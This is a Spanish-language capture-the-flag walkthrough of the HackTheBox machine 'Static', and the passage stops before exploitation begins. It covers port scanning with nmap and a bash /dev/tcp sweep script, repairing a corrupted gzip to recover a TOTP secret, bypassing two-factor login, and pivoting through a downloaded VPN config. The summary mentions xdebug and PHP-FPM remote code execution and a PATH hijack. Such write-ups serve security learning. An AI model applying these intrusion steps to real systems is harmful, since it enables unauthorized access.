---
layout      : post
title       : "HackTheBox - Static"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355banner.png
category    : [ htb ]
tags        : [ PHP-FPM, xdebug, openvpn, OPT, ssh-keys, path-hijacking ]
---
M√°quina Linux nivel dif√≠cil. Enumeraremos muchos servidores web, reconstruiremos comprimidos da√±ados, romperemos `xdebug`, romperemos `PHP-FMP` y romperemos terminales :P Juegos con llaves **SSH** yyyyyyyyy un `Path Hijacking` muy lococh√≥n.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355staticHTB.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [ompamo](https://www.hackthebox.eu/profile/9631).

Estamos certificados, tranquilos.

Vamos a encontrar un servidor web con un login bastante peye, pero nos frenar√° (pillin), para completar la autenticaci√≥n necesitamos proveer un `OPT` code.

Jugando con archivos comprimidos da√±ados y herramientas para arreglarlos obtendremos finalmente la combinaci√≥n perfecta para empezar a generar estos c√≥digos, una vez con los c√≥digos lograremos pasar el login-panel.

Estando dentro veremos los servidores internos que esta ejecutando la empresa y tambi√©n contaremos con la opci√≥n de descargar archivos `.ovpn` para conectarnos a esa red interna de la corporaci√≥n, moviendo manitos y pesta√±as de internet lograremos a√±adir rutas a las -tablas de rutas- :P para as√≠ conseguir conexi√≥n contra un segmento distinto al nuestro. As√≠ y solo as√≠ encontraremos otro servidor web (:

Ese servidor web esta corriendo `PHP` y una extensi√≥n llamada `xdebug` en su versi√≥n `2.6.0`, encontraremos una vulnerabilidad contra ella, la usaremos para obtener **ejecuci√≥n remota de comandos** en el servidor web, sin embargo, no una **Reverse Shell**, ya que esta se nos pondr√° un poco dif√≠cil de generar. Enumeraremos con ayuda de un script bastante fresco mi pana que hemos creado para encontrar cositas y agregar otras. Moviendo y bailando con `SSH` conseguiremos una Shell estable como `www-data`.

> [xdebug_rce.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/static/xdebug_rce.py)

Dando vueltas en el sistema y relacionando los servidores encontrados antes, veremos que podemos hablar con otro de los servidores, en este caso contra `pki`, generaremos un **port-fortwarding** inicialmente buscando plata y encontramos **oro**, viendo como viajan las peticiones del servidor tendremos el servicio `PHP-FPM` en su versi√≥n `7.1`, como ni√±os volveremos a jugar y encontraremos una vulnerabilidad que nos devuelve **ejecuci√≥n remota de comandos**, como √∫nicamente tenemos conectividad contra el servidor `web`, moveremos cielo y tierra para establecer una **Reverse Shell** contra ella, as√≠ tendremos una Shell en el sistema como `www-data` pero ahora en `pki`.

(El **RCE** nos gener√≥ bastantes lapsus mentales, as√≠ que nos creamos esta **FakeShell** muy sencilla)

> [phpFpmRCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/static/phpFpmRCE.py)

En el sistema encontraremos el **binario** encargado de generar los archivos `.ovpn` que vimos inicialmente, inspeccionando el objeto encontramos algunas rutas, sin embargo, lo m√°s relevante es que tiene activada una capability que permite cambiar el `UID` al usuario `root` (`UID=0`) mientras se ejecuta. Esto nos llama la atenci√≥n y con ayuda de `pspy` intentaremos ver que pasa por atr√°s mientras se personifica a `root`. Viendo los procesos internos del binario encontraremos unos llamados a programas sin sus rutas absolutas, nos aprovecharemos de eso para generar un `Path Hijacking` y hacer que el binario ejecute una **Reverse Shell** como el usuario `root` (:

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355rating.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355statistics.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 80%;"/>

Vulns conocidas y la m√°quina esta dirigida hacia la realidad.

> La idea inicial de esta locura es tener mis "notas" por si alg√∫n d√≠a se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) :) La segunda idea surgi√≥ con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo, al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo las ganas para ayudarnos ¬øpor qu√© no hacerlo? ... Un detalle es que si ves mucho texto, es porque me gusta mostrar tanto errores como √©xitos y tambi√©n plasmar todo desde una perspectiva m√°s de ense√±anza que de solo pasos a seguir. Sin menos, muchas gracias <3 Todo lo que ves es vida!

...

a m a r i

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Recorremos el puerto 8080, encontramos archivos, panel-login y **OTPs**](#puerto-8080).
  * [Encontramos comprimido da√±ado, lo arreglamos usando valor ASCII **CR** y **LF**](#fixgz).
  * [Relacionamos lo encontrado para hablar un poco sobre los OTPs (teor√≠a)](#talking-otp).
  * [Generamos c√≥digos **OTP** y logramos la autenticaci√≥n completa en el sitio web](#playing-otp).
  * [Nos enrutamos contra los servidores de otra VPN](#route-add).
3. [Explotaci√≥n](#explotacion).
  * [Jugamos con el nuevo servidor web](#php-info).
  * [Explotamos extensi√≥n de **PHP** y mediante **RCE** encontramos llaves **SSH**](#www-web-ssh).
4. [Encontramos otro servidor web: www-data (web) -> www-data (pki)](#www-data-pki).
  * [RCE contra **PHP-FPM 7.1**](#php-fpm).
5. [Escalada de privilegios](#escalada-de-privilegios).
  * [Vemos procesos internos en la ejecuci√≥n de un binario interesante (**/usr/bin/ersatool**)](#pspy-ersatool).
  * [Encontramos posible **Path Hijacking**](#ersatool-path-hijacking).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

---

```bash
‚ù± nmap -p- --open -v 10.10.10.246 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Pero nos indica:

```bash
...
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
...
```

El mismo `nmap` nos indica que colocar para evitar que la herramienta env√≠e trazas `ICMP` (ping) contra la m√°quina, us√©moslo:

```bash
‚ù± nmap -p- --open -v -Pn 10.10.10.246 -oG initScan
```

Y obtenemos:

```bash
‚ù± cat initScan 
# Nmap 7.80 scan initiated Wed Sep 22 25:25:25 2021 as: nmap -p- --open -v -Pn -oG initScan 10.10.10.246
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.246 ()   Status: Up
Host: 10.10.10.246 ()   Ports: 22/open/tcp//ssh///, 2222/open/tcp//EtherNetIP-1///, 8080/open/tcp//http-proxy///    Ignored State: filtered (65532)
# Nmap done at Wed Sep 22 25:25:25 2021 -- 1 IP address (1 host up) scanned in 370.99 seconds
```

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Podemos obtener una Shell de manera segura en el sistema. |
| 2222   | Ni idea. |
| 8080   | **[HTTP-Proxy](https://searchnetworking.techtarget.com/definition/port-80)**: Funciona como un t√∫nel por el que viajan antes las peticiones que realizamos hacia un sitio web. |

Pues ya con estos puertos, podemos enfocarnos en encontrar que versiones y scripts (los que usa `nmap` para sus escaneos profundos) son funcionales contra ellos y as√≠ descubrir m√°s info:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.246
    [*] Open ports: 22,2222,8080

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,2222,8080 -sC -sV -Pn 10.10.10.246 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y obtenemos:

```bash
‚ù± cat portScan 
# Nmap 7.80 scan initiated Wed Sep 22 25:25:25 2021 as: nmap -p 22,2222,8080 -sC -sV -Pn -oN portScan 10.10.10.246
Nmap scan report for 10.10.10.246
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 22 25:25:25 2021 -- 1 IP address (1 host up) scanned in 31.64 seconds
```

Bien, veamos que hay:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 2222   | SSH      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |

* Curiosamente, tenemos dos puertos corriendo `SSH`, jmmm...

---

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 8080   | HTTP     | Apache httpd 2.4.38 |

* Vemos dos rutas que posiblemente est√© sirviendo el servidor web:
  * `/vpn/`
  * `/.ftp_uploads/`

Y poco m√°s, empecemos a profundizar en esto y descubramos como explotar la m√°quina.

...

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

...

## Dando vueltas con el puerto 8080 [üìå](#puerto-8080) {#puerto-8080}

Haciendo una petici√≥n en la web nos devuelve una p√°gina en blanco:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page8080.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Si recordamos hab√≠amos visto dos posibles rutas que el servidor web supuestamente esta sirviendo, pues prob√©moslas:

üö¨ **`/vpn/`**:

```html
http://10.10.10.246:8080/vpn/login.php
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page8080_vpn.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Un login-panel, haciendo las pruebas de siempre con distintos usuarios que pueden (o no) existir en la db, probamos las credenciales `admin:admin` y vemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page8080_vpn_reqOTP.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Nos pide un c√≥digo **OTP** (ya hablaremos de esto) para poder acceder realmente a donde sea que debamos acceder... Pero claro, no lo tenemos, as√≠ que F.

Antes de profundizar revisemos el otro recurso.

üö¨ **`/.ftp_uploads/`**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page8080_ftpuploads_listfiles.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Si revisamos `warning.txt` nos dice esto:

```txt
Binary files are being corrupted during transfer!!! Check if are recoverable.
```

Jmmm, validemos si se refiere al archivo comprimido `db.sql.gz`, lo descargamos e intentamos descomprimirlo:

```bash
‚ù± file db.sql.gz 
db.sql.gz: gzip compressed data, was "db.sql", last modified: Thu Jun 18 15:43:42 2020, from Unix, original size modulo 2^32 355
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_gzip_dbSQLgz_error.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Efectivamente, hay errores en el archivo, pues "**<u>Check if are recoverable</u>**".

## Arreglamos el comprimido y vemos su contenido [üìå](#fixgz) {#fixgz}

Podemos tomar los dos errores y buscarlos en la web, quiz√°s haya alguna soluci√≥n o idea...

Despu√©s de recorrer varios recursos, entendemos el porqu√© del error:

üôá ***`invalid compressed data--crc error`: that is because you have download the file from FTP not using binary format.*** [invalid compressed data--crc error](https://www.unix.com/solaris/37260-invalid-compressed-data-crc-error.html)

Y probamos varias cositas:

* [How to recover a corrupted "tar.gz" file](https://unix.stackexchange.com/questions/17452/how-to-recover-a-corrupted-tar-gz-file).
* [The gzip Recovery Toolkit](https://www.urbanophile.com/arenn/coding/gzrt/gzrt.html).
* [Recovering a damaged .gz file](https://web.archive.org/web/20180708075208/http://www.gzip.org/recover.txt).

Pero ninguno funciona del todo, seguimos profundizando y con las b√∫squedas relacionadas con:

```html
invalid compressed data--length error
```

Llegamos a este hilo donde rese√±an una herramienta llamada `fixgz`:

* [Invalid compressed data--format violated?](https://stackoverflow.com/questions/33052406/invalid-compressed-data-format-violated).

---

```c
 * fixgz attempts to fix a binary file transferred in ascii mode by
 * removing each extra CR (Carriage Return) when it followed by LF (Line Feed).
```

Como bien nos indica, toma el binario que ha sido transferido err√≥neamente y remueve de cada l√≠nea los valores ASCII relacionados con el **retorno de carro**:

ü•á ***CR (Carriage Return) (`\r`): Se encarga de mover el cursor a la primera posici√≥n de una l√≠nea.***

Peeero solo los remueve si est√°n seguidos de un **salto de l√≠nea** (LF - Line Feed - \n). O sea, quita del binario esto: `\r\n` (que si no se ha entendido, esos dos loquitos generan una nueva l√≠nea vac√≠a, lo cual en un binario claramente da√±a la integridad del archivo)

> [Este recurso tambien puede ser util para entender lo que se quiere hacer](https://stackoverflow.com/questions/25322704/opening-file-in-binary-mode-and-saving-it-adds-new-line/25324147).

Intentemos entonces usar `fixgz` (en el mismo hilo esta la descarga), debemos compilarlo para generar el ejecutable:

```bash
‚ù± gcc fixgz.c -o fixgz
```

Obtenemos unos **warnings** pero nada alarmante. Ya teniendo el archivo √∫nicamente falta ejecutarlo y es muy sencillo:

```c
 * usage: fixgz  bad.gz fixed.gz
```

Entonces:

```bash
‚ù± ./fixgz db.sql.gz fixed_db.sql.gz
```

```bash
‚ù± file fixed_db.sql.gz 
fixed_db.sql.gz: gzip compressed data, was "db.sql", last modified: Thu Jun 18 15:43:42 2020, from Unix, original size modulo 2^32 355
```

```bash
‚ù± gzip -d fixed_db.sql.gz
```

Nada de errores yyyyyyyy el comprimido nos devuelve el archivo `fixed_db.sql` el cual contiene:

```sql
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

Opaaaa, un export del contenido de la base de datos `static` y su tabla `users`, vemos dos cosas interesantes:

* `password`: (pierde importancia si lo crackeamos, ya que encontramos la contrase√±a que ya usamos en el login, o sea `admin`).
* `totp`.

Si recordamos antes hab√≠amos pasado un login-panel con las credenciales `admin:admin` y nos ped√≠a un c√≥digo `OTP`... Este campo que encontramos tiene un nombre muy parecido, profundicemos y entendamos que tenemos...

## Hablamos un poco sobre <u>OTP</u> [üìå](#talking-otp) {#talking-otp}

üî¢ ***El c√≥digo `OTP` es una password o contrase√±a de un √∫nico uso (sus siglas en ingl√©s: One-Time Password), tambi√©n conocida como password o contrase√±a din√°mica. Se utiliza como segundo factor de autenticaci√≥n, adem√°s del nombre de usuario y la contrase√±a com√∫nmente utilizados. <u>Solo es v√°lida una vez</u>, <u>de forma que aunque un atacante consiguiera hacerse con ella no podr√≠a reutilizarla</u>***. [¬øQu√© es el c√≥digo OTP?](https://www.bancosantander.es/glosario/otp)

Perfecto, bastante sencillo y muy probablemente los hayas usado.

Existen dos tipos de `OTP`:

* `HOTP`.
* `TOTP`, que es el que al parecer tiene la web que estamos intentando visitar (el valor que obtuvimos del `.sql` se llama `totp` :P).

Que resumidamente (muuuy resumidamente):

> Los dos tipos de `OTP` toman <u>dos</u> tipos de informaci√≥n, una **<u>clave secreta</u>** y un **<u>factor m√≥vil</u>**. 

La definici√≥n de la clave secreta es eso, **una clave (secreta)** ü§™ y los factores m√≥viles los describimos ahora:

| Factor m√≥vil | Descripci√≥n |
| ------------ | :---------- |
| HOTP | **HMAC-based One-time Password algorithm** esta basado en un contador (factor m√≥vil), el c√≥digo `OPT` se genera seg√∫n ese contador. Cada vez que se intenta una autenticaci√≥n el contador cambia, por lo que el pr√≥ximo c√≥digo `OTP` tambi√©n cambiar√°. |
| TOTP | **Time-based One-time Password** es m√°s sencillo de entender, ya que el factor m√≥vil es el tiempo, por lo que cada que se intenta una autenticaci√≥n tenemos 30/60 segundos para colocar el c√≥digo `OTP`, pasado el tiempo se genera un nuevo `OTP`. |

Les dejo unos recursos por si algo:

* [What‚Äôs the Difference Between OTP, TOTP and HOTP?](https://www.onelogin.com/learn/otp-totp-hotp).
* [HOTP frente a TOTP: ¬øEn qu√© se diferencian?](https://es.microcosm.com/blog/hotp-totp-what-is-the-difference).

Pues perfecto, tenemos los dos tipos de informaci√≥n, la llave secreta deducimos que es el campo `totp` del archivo `.sql` y tambi√©n sabemos que el factor m√≥vil es el tiempo, o sea el tipo de **OTP** es el `TOTP`, as√≠ que tamos completicos, veamos si podemos empezar a generar c√≥digos...

## Generamos c√≥digos <u>OTP</u> y autenticaci√≥n total [üìå](#playing-otp) {#playing-otp}

Leyendo m√°s sobre el tema:

* [TOTP (Time-based One-Time Passwords)](https://www.twilio.com/docs/glossary/totp).
* [Time Based One Time Password (TOTP, OTP)](https://www.hypr.com/time-based-time-password-totp-otp/).

Ca√≠ en cuenta que existen varias extensiones que podemos agregar a nuestro navegador para jugar con el doble factor de autenticaci√≥n, una de ellas es [Authenticator](https://authenticator.cc/), la instalamos y vemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355google_authenticator_clean.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Y seguimos estos pasos: 

* Clic en `Edit`, luego en `Add Account` y despu√©s `Manual Entry`.

Finalmente ver√≠amos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355google_authenticator_manualEntry_clean.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

El campo `Secret` se relaciona con lo encontrado antes en nuestra enumeraci√≥n, pues si colocamos ah√≠ nuestra llave secreta encontrada en el archivo `.sql`, obtenemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355google_authenticator_generatingCodes.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Perfect√≠simo, se nos empiezan a generar los c√≥digos `OTP` basados en tiempo (por si no se ve la flecha que hice, nos muestra cuanto tiempo queda de validez contra X c√≥digo), ahora que tenemos esto, volvamos al apartado del **login-panel** y probemos con los c√≥digos a ver si logramos la autenticaci√≥n completa...

* Nos logeamos con `admin:admin`.
* Tomamos un c√≥digo que nos genere la extensi√≥n.
* Yyyyyy...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page8080_validOTPcode_internalITsupport.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Opaaaa, ahora si tamos dentroooooooo :)

...

Tenemos 5 direcciones IP que hacen referencia a 5 servidores, uno de ellos (**pub**) al parecer no esta funcional y otro (**pki**) tiene una direcci√≥n bastante distinta a las dem√°s, lo cual nos pone alerta sobre ella, ¬øno? :P

Tambi√©n tenemos un campo en el que podemos generar -algo- seg√∫n el [common name](https://support.dnsimple.com/articles/what-is-common-name/) que indiquemos, probemos por ejemplo con `pki`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page8080_internalIT_pkiOVPN.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Nos genera un archivo `<cn>.ovpn`:

üïµÔ∏è ***El archivo con extensiones <u>OVPN</u> almacena la configuraci√≥n de conexi√≥n utilizada por `OpenVPN`, una herramienta de software o gesti√≥n de redes virtuales. El archivo de configuraci√≥n OVPN contiene configuraciones de acceso a la <u>red privada virtual y configuraci√≥n del cliente</u>.*** [¬øQu√© es el archivo OVPN?](https://www.file-extension.info/es/format/ovpn)

(Ya sabemos como usarlo, con uno de esos nos conectamos a `HTB`)

Lo descargamos y si vemos su contenido tenemos lo primero interesante:

```bash
‚ù± cat pki.ovpn
client
dev tun9
proto udp
remote vpn.static.htb 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun

remote-cert-tls server

cipher AES-256-CBC
#auth SHA256
key-direction 1
verb 3
<ca>
-----BEGIN CERTIFICATE-----
MIIDRzCCAi+gAwIBAgIUR+mYrXHJORV4tbg81sQS7RfjYK4wDQYJKoZIhvcNAQEL
...
qYSaD5L082aZQj/S+qfTgkRiT2nduN1pZURn
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            98:84:91:cc:bd:6d:9d:ac:71:56:71:8a:b5:2f:31:60
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=static-gw
        Validity
            Not Before: Sep 28 19:04:08 2021 GMT
            Not After : Sep  4 19:04:08 2121 GMT
        Subject: CN=pki
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:a7:0d:7b:e3:f9:1d:ab:9f:3e:07:8c:20:6f:7a:
                    ...
                    47:53
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Subject Key Identifier: 
                ED:EB:1E:92:4F:D8:27:23:07:10:41:DC:72:86:23:84:8E:BB:2B:E4
            X509v3 Authority Key Identifier: 
                keyid:A1:DA:83:60:32:81:7F:1B:80:19:E0:20:2D:D6:60:C8:A5:ED:82:54
                DirName:/CN=static-gw
                serial:47:E9:98:AD:71:C9:39:15:78:B5:B8:3C:D6:C4:12:ED:17:E3:60:AE

            X509v3 Extended Key Usage: 
                TLS Web Client Authentication
            X509v3 Key Usage: 
                Digital Signature
    Signature Algorithm: sha256WithRSAEncryption
         21:f1:af:ff:29:e3:ca:af:af:e6:67:e6:78:ba:e7:24:35:74:
         ...
         9b:bb:63:00
-----BEGIN CERTIFICATE-----
MIIDUDCCAjigAwIBAgIRAJiEkcy9bZ2scVZxirUvMWAwDQYJKoZIhvcNAQELBQAw
...
3WEutTcHy0WLTjzF3k5hBgZD6KvZEA9q8BBvxbr8s06bu2MA
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCnDXvj+R2rnz4H
...
bA+mpEVyP75+AxdAQYloZsk=
-----END PRIVATE KEY-----
</key>
key-direction 1
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
09a194dc6aee4ae65459c682cc0b25e9
...
ea5f5af8329f367f112599f3e668bd7a
-----END OpenVPN Static key V1-----
</tls-auth>
```

Esa es la estructura del archivo, si nos fijamos al inicio hay un dominio:

```bash
...
remote vpn.static.htb 1194
...
```

Pero agreg√°ndolo al archivo [/etc/hosts](https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html) no obtenemos nada distinto en cuanto a resoluci√≥n de nuevos recursos...

Pues veamos si realmente nos conecta a otra red mediante la **VPN**:

```bash
‚ù± openvpn pki.ovpn
...
Tue Sep 28 25:25:25 2021 Initialization Sequence Completed
```

Perfecto, revisemos a que segmento tenemos acceso:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_ifconfig_tun9.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Vemos las dos **VPN** a las que estoy conectado, la de `HackTheBox` y la nueva que nos ofrece la m√°quina `Static`...

Se nos asigna la IP `172.30.0.10`, con lo que tenemos acceso (siempre y cuando est√©n activas) a las direcciones del segmento `172.30.0.0/24` (172.30.0.1, 172.30.0.2, ...)

> Algo que se nos viene a la cabeza es que quizas los demas `CN` nos conecten a otros segmentos, pero nop, todos los archivos que descarguemos nos van a conectar a este mismo segmento (:

Volviendo a nuestro apartado con las 5 IPs:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page8080_validOTPcode_internalITsupport.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

A la √∫nica direcci√≥n que podemos hacerle `ping` es al servidor `vpn` y nos responde...

Ac√° podemos intentar descubrir otras IPs activas del segmento y en caso de existir, ver si tienen puertos abiertos:

```bash
‚ù± cat tryWITHips.sh
#!/bin/bash

ip=$(echo $1 | cut -d '.' -f -3)  # Extraemos el identificador de red

for port in 22 25 80 8000 8080 2222 2049 111 1194 3306 53 3000 5000 32768 32769 32770 32771; do
    for segment in $(seq 1 254); do
                                     # ie: 10.10.10.<segment>/<port>
        timeout 1 bash -c "echo '' > /dev/tcp/$ip.$segment/$port" 2>/dev/null && echo "IP: $ip.$segment - Port: $port" &
    done; wait
done

```

Ejecut√°ndolo tenemos:

```bash
‚ù± ./tryWITHips.sh 172.30.0.0
IP: 172.30.0.1 - Port: 22
IP: 172.30.0.1 - Port: 2222
IP: 172.30.0.10 - Port: 111
```

Despu√©s de ver las versiones y scripts con `nmap` no obtenemos nada interesante, as√≠ que sigamos buscando maneras de romper lo encontrado...

...

## Nos enrutamos contra los servidores de otra VPN [üìå](#route-add) {#route-add}

Dando vueltas (muchas) nos damos cuenta de que hay un segmento bastante cercano al actual (`172.20.0.0/24`) que usa dos servidores: `db` y `web`, buscando formas de conectarnos o interactuar encontramos el comando `route`, con √©l lograremos ver las tablas de rutas IP que maneja la red.

* [Routing Tables: **netstat -rn** y **route -n**](https://rm-rf.es/routing-tables-netstat-rn-y-route-n/).
* [Enrutar en Linux (**route add/del**)](https://rm-rf.es/enrutar-en-linux-route-add-del/).

‚≠ï ***La tabla de enrutamiento enumera las direcciones IP de las redes que conoce el sistema.*** [üìë](https://docs.oracle.com/cd/E19957-01/820-2981/gdyen/index.html)

As√≠ que podemos apoyarnos de `route` para agregar ese segmento a nuestra red a ver si logramos ver alguno de los servidores:

```bash
‚ù± route add -net 172.20.0.0/24 tun9
```

Le indicamos que agregue el segmento `172.20.0.0/24` sobre la interfaz `tun9`, que es donde tenemos la **VPN** de `Static`, as√≠ que estar√≠amos conectaos' y en teor√≠a nos ver√≠amos las caras :P

```bash
‚ù± route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.10.14.0      0.0.0.0         255.255.254.0   U     0      0        0 tun0
...
172.17.0.0      172.30.0.1      255.255.255.0   UG    0      0        0 tun9
...
172.20.0.0      0.0.0.0         255.255.255.0   U     0      0        0 tun9
...
172.30.0.0      0.0.0.0         255.255.0.0     U     0      0        0 tun9
```

Perfecto, validemos si tenemos conectividad:

```bash
‚ù± ping -c 1 172.20.0.10
PING 172.20.0.10 (172.20.0.10) 56(84) bytes of data.
64 bytes from 172.20.0.10: icmp_seq=1 ttl=63 time=107 ms

--- 172.20.0.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 106.986/106.986/106.986/0.000 ms
```

```bash
‚ù± ping -c 1 172.20.0.11
PING 172.20.0.11 (172.20.0.11) 56(84) bytes of data.
64 bytes from 172.20.0.11: icmp_seq=1 ttl=63 time=107 ms

--- 172.20.0.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 106.974/106.974/106.974/0.000 ms
```

Liiiiistones, pues aprovechemos el script de antes para ver que direcciones est√°n activas y si tienen alg√∫n puerto expuesto:

```bash
‚ù± ./tryWITHips.sh 172.20.0.0
IP: 172.20.0.10 - Port: 22
IP: 172.20.0.1 - Port: 22
IP: 172.20.0.10 - Port: 80
IP: 172.20.0.1 - Port: 2222
IP: 172.20.0.11 - Port: 3306
```

Bien, tenemos los dos que nos mostraba la web:

* web : 172.20.0.10 -> 80
* db : 172.20.0.11 -> 3306

Inspeccionemos el servidor web a ver si es lo mismo que ya ten√≠amos o es otro...

...

# Explotaci√≥n [#](#explotacion) {#explotacion}

...

## Jugamos con el nuevo servidor web [üìå](#php-info) {#php-info}

Visitando la direcci√≥n IP vemos:

